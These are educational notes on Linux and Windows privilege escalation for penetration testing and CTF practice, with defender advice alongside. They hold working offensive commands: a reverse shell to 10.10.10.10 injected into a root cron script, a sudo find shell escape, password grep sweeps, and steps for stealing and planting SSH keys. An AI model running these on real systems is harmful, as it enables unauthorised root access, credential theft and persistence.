# Privilege Escalation (PrivEsc) Checklists — Notes

## Why PrivEsc Matters

Once we gain **initial access** to a box (low-privilege shell, e.g., `www-data`, a standard domain user, etc.), the next goal is to **thoroughly enumerate** the system to find vulnerabilities that let us escalate to a higher privilege level — ultimately `root` on Linux or `SYSTEM`/Administrator on Windows.

Initial access is rarely the end goal in a real engagement or CTF — it's a foothold. Full impact (data access, lateral movement, persistence) usually requires escalated privileges.

### Checklist & Cheat Sheet Resources

| Resource | Covers | Notes |
|---|---|---|
| **HackTricks** | Linux + Windows local PrivEsc | Extremely detailed, de-facto standard checklist; organized by vector |
| **PayloadsAllTheThings** | Linux + Windows PrivEsc checklists | Strong on exploit PoCs and command snippets |
| **GTFOBins** | Linux `sudo`/SUID binary abuse | One-liners per binary |
| **LOLBAS** | Windows "Living Off the Land" binaries | Same idea as GTFOBins, for Windows |

**Key mindset:** don't just copy-paste commands from a checklist — run them, read the output, and understand *why* each check matters. Build muscle memory for recognizing misconfigurations rather than memorizing exact syntax.

---

## 1. Enumeration Scripts

Manual enumeration is important to learn, but automated scripts save time and catch things you might miss.

| OS | Script | What it does |
|---|---|---|
| Linux | **LinEnum** | Broad enumeration: kernel/OS info, users, sudo rights, cron, SUID/SGID, writable files, network info |
| Linux | **linuxprivchecker** | Python-based, similar scope to LinEnum, with suggested exploits based on kernel version |
| Linux | **linPEAS** (part of PEASS) | Very thorough, color-coded output highlighting likely privesc vectors |
| Windows | **Seatbelt** | C# tool; security-oriented host survey (services, AV, patches, auto-run, etc.) |
| Windows | **JAWS** | PowerShell enumeration script, lighter-weight alternative to Seatbelt |
| Windows | **winPEAS** (part of PEASS) | Equivalent of linPEAS for Windows; highlights likely vectors by color |

### PEASS (Privilege Escalation Awesome Scripts SUITE)

- Actively maintained, so it stays current with new techniques.
- Includes both `linpeas.sh` and `winpeas.exe`/`winPEASany.exe`.
- Color-coded output: red/yellow highlights = worth investigating first.
- **Hacker perspective:** run early after getting a shell — it's often the fastest path to spotting a vector, but always sanity-check its findings manually (some flags are noisy/false-positive-prone).
- **Defender perspective:** EDR/AV commonly flags PEASS scripts by signature — expect detections in monitored environments; this is also a useful detection opportunity defensively (alert on linpeas/winpeas execution).

### Practical Usage

```bash
# Linux — transfer and run linpeas
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

```powershell
# Windows — download and run winPEAS (adjust for AV/EDR evasion needs)
iwr -Uri http://10.10.10.10/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe
```

---

## 2. Kernel Exploits

If the kernel version is outdated, there may be a public exploit that grants root directly.

- **Example: DirtyCow (CVE-2016-5195)** — a race condition in the Linux kernel's copy-on-write (COW) mechanism, allowing a local unprivileged user to gain write access to read-only memory mappings, which can be abused to modify `/etc/passwd` or inject code into a root-owned process → root shell.
  - Workflow: identify kernel version (`uname -a`), confirm it's vulnerable, download exploit PoC, compile and run it.

### Process

1. Enumerate kernel version: `uname -a`, `/proc/version`, `cat /etc/os-release`.
2. Search for known CVEs matching that kernel/OS (searchsploit, Google, HackTricks).
3. Compile the exploit (often needs `gcc` on target, or cross-compile and transfer the binary).
4. Run it and verify privilege escalation.

**Caution (both perspectives):**
- **Hacker:** kernel exploits can be unstable and **crash the target** (especially in production-like environments) — risky in real engagements, more acceptable in isolated CTF boxes.
- **Defender:** keep kernels patched; unpatched/EOL kernels are a leading cause of "easy" root in assessments. Kernel-exploit attempts often show up as unexpected crashes/core dumps in logs — worth monitoring.

---

## 3. Vulnerable / Misconfigured Software

Outdated third-party software, custom applications, or misconfigured services running with elevated privileges are common vectors.

- Check installed software versions (`dpkg -l`, `rpm -qa`, Windows: installed programs / `wmic product get name,version`) against known CVEs.
- Look for services running as root/SYSTEM that accept untrusted input (custom web apps, internal APIs, local daemons).
- Check for **weak file/folder permissions** on service binaries or config files — if a root-owned service's binary is writable by our user, we can replace it.

---

## 4. Abusing User Privileges (sudo rights / LOLBins)

### Linux — `sudo` Abuse & GTFOBins

- Check what we're allowed to run as another user: `sudo -l`
- **GTFOBins** (https://gtfobins.github.io/) catalogs Unix binaries and how they can be abused when invoked via `sudo`, SUID, or other contexts (e.g., `find`, `vim`, `less`, `awk`) to spawn a shell or read/write arbitrary files.
  - Example: if `sudo` allows running `find` as root:
    ```bash
    sudo find . -exec /bin/sh \; -quit
    ```
- Also check **SUID/SGID binaries**: `find / -perm -4000 -type f 2>/dev/null` — cross-reference results against GTFOBins.

### Windows — LOLBAS

- **LOLBAS** (https://lolbas-project.github.io/) catalogs built-in Windows binaries ("Living Off the Land Binaries") that can be abused to download files, execute code, or bypass restrictions — often under the context of a privileged process (e.g., `certutil`, `mshta`, `regsvr32`).
- Useful when AV/EDR blocks custom tooling — LOLBins are signed, trusted Microsoft binaries, so they blend in.

**Defender note:** both GTFOBins and LOLBAS abuse rely on misconfiguration (overly broad `sudo` rules, unnecessary SUID bits, unrestricted access to admin tooling) — principle of least privilege is the core mitigation.

---

## 5. Scheduled Tasks / Cron Jobs

Two general approaches:

1. **Add a new scheduled task/cron job** ourselves (if we have the rights to create one).
2. **Trick an existing task into executing malicious code** (if we can write to a script/binary it already calls, or to a directory ahead of it in `$PATH`).

### Linux — Cron Jobs

Check these locations for **write access**:

| Path | Purpose |
|---|---|
| `/etc/crontab` | System-wide cron table |
| `/etc/cron.d/` | Drop-in directory for cron jobs |
| `/var/spool/cron/crontabs/root` | Root user's personal crontab |

Also check:
- `crontab -l` for the current user's own cron jobs.
- Any script referenced *by* a cron job (e.g., `/opt/backup.sh` run by root every 5 minutes) — if that script is writable by us, we can inject a payload.
- **Relative-path abuse**: if a root cron job runs a script without specifying a full path, and we can write earlier in `$PATH`, we can shadow the binary it calls.

**Exploitation pattern:**

```bash
# If we can write to a script called by root's cron job:
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /path/to/writable/cron-script.sh
# Wait for the cron job to trigger, then catch the reverse shell:
nc -lvnp 4444
```

### Windows — Scheduled Tasks

- Enumerate with `schtasks /query /fo LIST /v` or PowerShell `Get-ScheduledTask`.
- Check the permissions on the **target binary/script** each task runs (`icacls`) — if writable by us and the task runs as SYSTEM/Administrator, same pattern as cron abuse applies.
- Check whether we can **create new scheduled tasks** ourselves (depends on our current privileges/group membership).

---

## 6. Exposed Credentials

Credentials are frequently left lying around in places that aren't locked down as tightly as they should be:

| Location | What to look for |
|---|---|
| Configuration files | DB connection strings, API keys, hardcoded passwords (web app configs, `.env`, `wp-config.php`, `web.config`) |
| Log files | Accidentally logged passwords/tokens, especially from failed login attempts or debug logging |
| Shell/command history | `~/.bash_history` (Linux) — passwords typed directly on the command line; `ConsoleHost_history.txt` under PSReadLine (Windows) — same idea for PowerShell |
| Backup files | `.bak`, `.old`, `.zip` copies of config files that may not be access-controlled the same way |
| Memory / process list | Credentials sometimes visible in running process arguments (`ps aux`) |
| Browser-saved credentials | On Windows, saved credentials in browser profiles or Windows Credential Manager (`cmdkey /list`) |

**Search commands:**

```bash
# Linux — quick grep sweep for common secret keywords
grep -ri "password" /etc /var /opt --include=*.{conf,cfg,ini,xml,txt} 2>/dev/null
cat ~/.bash_history
```

```powershell
# Windows — PSReadLine history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Hacker perspective:** credential reuse is common — a password found in a config file or history often works for `su`, `sudo`, SSH, RDP, or a different service entirely.
**Defender perspective:** never hardcode secrets in config/log files; use secrets managers; restrict read access to history/log files; rotate credentials found in plaintext.

---

## 7. SSH Keys

### Reading Existing Private Keys

If we have **read access** to a user's `.ssh` directory, we may be able to read their private key:

- `/home/<user>/.ssh/id_rsa`
- `/root/.ssh/id_rsa`

If readable, copy it to our attacking machine and authenticate with it:

```bash
# Fix permissions (SSH refuses keys that are too open)
chmod 600 id_rsa

# Log in using the stolen key
ssh -i id_rsa root@10.10.10.10
```

### Planting a Key for Persistent Access (Write Access Case)

If we have **write access** to a user's `.ssh` directory (but haven't already compromised that exact user), we can add our *public* key to their `authorized_keys` file:

```bash
# Generate a new keypair locally
ssh-keygen -f privesc_key

# Append our public key to the target user's authorized_keys
cat privesc_key.pub >> /home/<user>/.ssh/authorized_keys

# Then connect as that user with our private key
ssh -i privesc_key <user>@10.10.10.10
```

**Important caveat:** SSH will not accept a key *written by another user* unless we already have write access to that user's `authorized_keys` — meaning this technique is for **maintaining/upgrading access** once we already control the relevant account or filesystem location, not a way to jump to a user we've never touched. It's most commonly used to convert a web shell / RCE foothold into a stable SSH session.

**Defender perspective:** monitor `authorized_keys` files for unexpected modifications (file integrity monitoring); restrict `.ssh` directory permissions (`700` for the dir, `600` for files); disable password-only or overly permissive SSH configs.

---

## Quick Reference Summary

| Vector | Linux Check | Windows Check |
|---|---|---|
| Enumeration script | `linpeas.sh` | `winPEAS.exe`, Seatbelt |
| Kernel exploits | `uname -a` → searchsploit | `systeminfo` → Watson/Sherlock |
| Sudo/LOLBin abuse | `sudo -l` → GTFOBins | `whoami /priv` → LOLBAS |
| SUID binaries | `find / -perm -4000 2>/dev/null` | N/A |
| Scheduled tasks | `/etc/crontab`, `/etc/cron.d/`, crontab perms | `schtasks /query`, `icacls` on task binaries |
| Exposed creds | `.bash_history`, config files, logs | PSReadLine history, `web.config`, Credential Manager |
| SSH keys | `.ssh/id_rsa` read/write checks | N/A (WinRM/RDP creds instead) |

---

## General PrivEsc Methodology

1. **Enumerate first, exploit second** — run manual checks + an automated script (linPEAS/winPEAS), then cross-reference findings.
2. **Confirm current context**: `id`, `whoami /priv` (Windows) — know exactly what privileges/groups you already have before searching for more.
3. **Prioritize low-risk vectors** (misconfigurations, exposed creds, sudo rights) before high-risk ones (kernel exploits that can crash the box).
4. **Document everything** — which checks were run, what was found, and what worked — both for write-ups and for repeatability in future engagements.
